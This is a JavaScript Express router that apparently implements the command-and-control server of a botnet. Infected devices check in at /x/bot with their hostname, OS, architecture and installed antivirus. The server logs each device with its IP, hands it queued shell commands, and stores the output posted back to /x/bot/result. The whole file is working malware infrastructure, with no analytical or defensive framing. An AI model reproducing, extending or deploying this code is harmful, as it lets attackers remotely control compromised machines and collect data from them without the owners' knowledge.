const express = require('express');
const router = express.Router();
const db = require('../database');

// GET /x/bot?id=<device_id>&sys=<encoded_info>
router.get('/', (req, res) => {
  try {
    const { id, sys } = req.query;
    if (!id) return res.status(400).send('missing id');

    let os = '', av = '', arch = '';
    if (sys) {
      sys.split('|').forEach(p => {
        const [key, val] = p.split('=');
        if (key === 'os') os = decodeURIComponent(val || '');
        if (key === 'av') av = decodeURIComponent(val || '');
        if (key === 'arch') arch = decodeURIComponent(val || '');
      });
    }

    const hostname = id.split('_')[0];
    const now = Date.now();

    const upsert = db.prepare(`
      INSERT INTO devices (device_id, hostname, os, arch, av, first_seen, last_seen, ip)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(device_id) DO UPDATE SET
        hostname = excluded.hostname,
        os = excluded.os,
        arch = excluded.arch,
        av = excluded.av,
        last_seen = excluded.last_seen,
        ip = excluded.ip
    `);
    upsert.run(id, hostname, os, arch, av, now, now, req.ip);

    const cmd = db.prepare(
      "SELECT id, command FROM commands WHERE device_id = ? AND status = 'pending' ORDER BY created_at ASC LIMIT 1"
    ).get(id);

    if (cmd) {
      db.prepare("UPDATE commands SET status = 'delivered', delivered_at = ? WHERE id = ?").run(now, cmd.id);
      return res.send(cmd.command);
    }
    res.send('');
  } catch (err) {
    console.error('/x/bot error:', err);
    res.status(500).send('');
  }
});

// POST /x/bot/result
router.post('/result', (req, res) => {
  try {
    const { device_id, d } = req.body;
    if (!device_id || !d) return res.status(400).send('missing fields');

    const now = Date.now();
    db.prepare('INSERT INTO results (device_id, command, output, created_at) VALUES (?, ?, ?, ?)').run(device_id, 'unknown', d, now);
    db.prepare("UPDATE commands SET status = 'completed', completed_at = ? WHERE device_id = ? AND status = 'delivered'").run(now, device_id);

    res.send('OK');
  } catch (err) {
    console.error('/x/bot/result error:', err);
    res.status(500).send('OK');
  }
});

module.exports = router;
